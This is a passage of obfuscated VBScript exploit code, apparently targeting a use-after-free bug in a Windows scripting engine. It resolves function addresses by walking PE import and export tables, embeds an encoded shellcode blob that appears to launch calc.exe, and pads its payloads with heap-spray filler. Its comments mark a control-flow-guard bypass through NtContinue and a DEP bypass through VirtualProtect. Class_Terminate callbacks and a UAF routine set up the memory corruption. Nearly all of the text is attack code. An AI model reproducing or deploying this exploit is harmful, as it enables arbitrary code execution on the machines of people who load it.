        Next
        StrCompWrapper=StrComp(UCase(lIIlI),UCase(llIlIl))
    End Function
    Function GetBaseFromImport(base_address,name_input)
        Dim import_rva,nt_header,descriptor,import_dir
        Dim IIIIII
        nt_header=GetUint32(base_address+(&h3c))
        import_rva=GetUint32(base_address+nt_header+&h80)
        import_dir=base_address+import_rva
        descriptor=0
        Do While True
            Dim Name
            Name=GetUint32(import_dir+descriptor*(&h14)+&hc)
            If Name=0 Then
                GetBaseFromImport=&hBAAD0000
                Exit Function
            Else
                If StrCompWrapper(base_address+Name,name_input)=0 Then
                    Exit Do
                End If
            End If
            descriptor=descriptor+1
        Loop
        IIIIII=GetUint32(import_dir+descriptor*(&h14)+&h10)
        GetBaseFromImport=GetBaseByDOSmodeSearch(GetUint32(base_address+IIIIII))
    End Function
    Function GetProcAddr(dll_base,name)
        Dim p,export_dir,index
        Dim function_rvas,function_names,function_ordin
        Dim Illlll
        p=GetUint32(dll_base+&h3c)
        p=GetUint32(dll_base+p+&h78)
        export_dir=dll_base+p
        function_rvas=dll_base+GetUint32(export_dir+&h1c)
        function_names=dll_base+GetUint32(export_dir+&h20)
        function_ordin=dll_base+GetUint32(export_dir+&h24)
        index=0
        Do While True
            Dim lllI
            lllI=GetUint32(function_names+index*4)
            If StrCompWrapper(dll_base+lllI,name)=0 Then
                Exit Do
            End If
            index=index+1
        Loop
        Illlll=IllIIl(function_ordin+index*2)
        p=GetUint32(function_rvas+Illlll*4)
        GetProcAddr=dll_base+p
    End Function
    Function GetShellcode()
        IIlI=Unescape("%u0000%u0000%u0000%u0000") &Unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u652e%u6578%u4100%u0065%u0000%u0000%u0000%u0000%u0000%ucc00%ucccc%ucccc%ucccc%ucccc" &lIIII(IIIII("")))
        IIlI=IIlI & String((&h80000-LenB(IIlI))/2,Unescape("%u4141"))
        GetShellcode=IIlI
    End Function
    Function EscapeAddress(ByVal value)
        Dim High,Low
        High=lIlI((value And &hffff0000)/&h10000,4)
        Low=lIlI(value And &hffff,4)
        EscapeAddress=Unescape("%u" &Low &"%u" &High)
    End Function
    Function lIllIl
        Dim IIIl,IlllI,IIlI,IlIII,llllI,llIII,lIllI
        IlllI=lIlI(NtContinueAddr,8)
        IlIII=Mid(IlllI,1,2)
        llllI=Mid(IlllI,3,2)
        llIII=Mid(IlllI,5,2)
        lIllI=Mid(IlllI,7,2)
        IIlI=""
        IIlI=IIlI &"%u0000%u" &lIllI &"00"
        For IIIl=1 To 3
            IIlI=IIlI &"%u" &llllI &llIII
            IIlI=IIlI &"%u" &lIllI &IlIII
        Next
        IIlI=IIlI &"%u" &llllI &llIII
        IIlI=IIlI &"%u00" &IlIII
        lIllIl=Unescape(IIlI)
    End Function
    Function WrapShellcodeWithNtContinueContext(ShellcodeAddrParam) 'bypass cfg
        Dim IIlI
        IIlI=String((100334-65536),Unescape("%u4141"))
        IIlI=IIlI &EscapeAddress(ShellcodeAddrParam)
        IIlI=IIlI &EscapeAddress(ShellcodeAddrParam)
        IIlI=IIlI &EscapeAddress(&h3000)
        IIlI=IIlI &EscapeAddress(&h40)
        IIlI=IIlI &EscapeAddress(ShellcodeAddrParam-8)
        IIlI=IIlI &String(6,Unescape("%u4242"))
        IIlI=IIlI &lIllIl()
        IIlI=IIlI &String((&h80000-LenB(IIlI))/2,Unescape("%u4141"))
        WrapShellcodeWithNtContinueContext=IIlI
    End Function
    Function ExpandWithVirtualProtect(lIlll)
        Dim IIlI
        Dim lllllI
        lllllI=lIlll+&h23
        IIlI=""
        IIlI=IIlI &EscapeAddress(lllllI)
        IIlI=IIlI &String((&hb8-LenB(IIlI))/2,Unescape("%4141"))
        IIlI=IIlI &EscapeAddress(VirtualProtectAddr)
        IIlI=IIlI &EscapeAddress(&h1b)
        IIlI=IIlI &EscapeAddress(0)
        IIlI=IIlI &EscapeAddress(lIlll)
        IIlI=IIlI &EscapeAddress(&h23)
        IIlI=IIlI &String((&400-LenB(IIlI))/2,Unescape("%u4343"))
        ExpandWithVirtualProtect=IIlI
    End Function
    Sub ExecuteShellcode
        llll.mem(IlII)=&h4d 'DEP bypass
        llll.mem(IlII+8)=0
      msgbox(IlII)        'VT replaced
    End Sub
    Class cla1
    Private Sub Class_Terminate()
        Set IIIlI(IllI)=lIIl((&h1078+5473-&H25d8))
        IllI=IllI+(&h14b5+2725-&H1f59)
        lIIl((&h79a+3680-&H15f9))=(&h69c+1650-&Hd0d)
    End Sub
    End Class
    Class cla2
    Private Sub Class_Terminate()
        Set IllII(IllI)=lIIl((&h15b+3616-&Hf7a))
        IllI=IllI+(&h880+542-&Ha9d)
        lIIl((&h1f75+342-&H20ca))=(&had3+3461-&H1857)
    End Sub
    End Class
    Class IIIlIl
    End Class
    Class llIIl
    Dim mem
    Function P
    End Function
    Function SetProp(Value)
        mem=Value
        SetProp=0
    End Function
    End Class
    Class IIIlll
    Dim mem
    Function P0123456789
        P0123456789=LenB(mem(IlII+8))
    End Function
    Function SPP
    End Function
    End Class
    Class lllIIl
    Public Default Property Get P
    Dim llII
    P=174088534690791e-324
    For IIIl=(&h7a0+4407-&H18d7) To (&h2eb+1143-&H75c)
        IIIlI(IIIl)=(&h2176+711-&H243d)
    Next
    Set llII=New IIIlll
    llII.mem=lIlIIl
    For IIIl=(&h1729+3537-&H24fa) To (&h1df5+605-&H204c)
        Set IIIlI(IIIl)=llII
    Next
    End Property
    End Class
    Class llllII
    Public Default Property Get P
    Dim llII
    P=636598737289582e-328
    For IIIl=(&h1063+2314-&H196d) To (&h4ac+2014-&Hc84)
        IllII(IIIl)=(&h442+2598-&He68)
    Next
    Set llII=New IIIlll
    llII.mem=lIIIll
    For IIIl=(&h7eb+3652-&H162f) To (&h3e8+1657-&Ha5b)
        Set IllII(IIIl)=llII
    Next
    End Property
    End Class
    Set llllIl=New lllIIl
    Set IlIIII=New llllII
    Sub UAF
        For IIIl=(&hfe8+3822-&H1ed6) To (&h8b+8633-&H2233)
            Set IIllI(IIIl)=New IIIlIl
        Next